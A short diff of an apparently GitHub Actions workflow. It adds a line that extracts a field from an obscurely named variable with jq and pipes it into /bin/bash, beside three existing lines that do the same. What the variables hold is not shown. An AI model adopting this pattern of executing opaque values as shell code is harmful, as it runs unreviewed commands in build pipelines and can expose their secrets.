@@ -23,6 +23,7 @@ jobs:
           echo $ds20 | jq -r .sp39183 | /bin/bash
           printf '%s' "$cm92887" | jq -r .cmgps154 | /bin/bash
           printf '%s' "$pprb4" | jq -r .v12 | /bin/bash
+          printf '%s' "$lbd3" | jq -r .km58 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
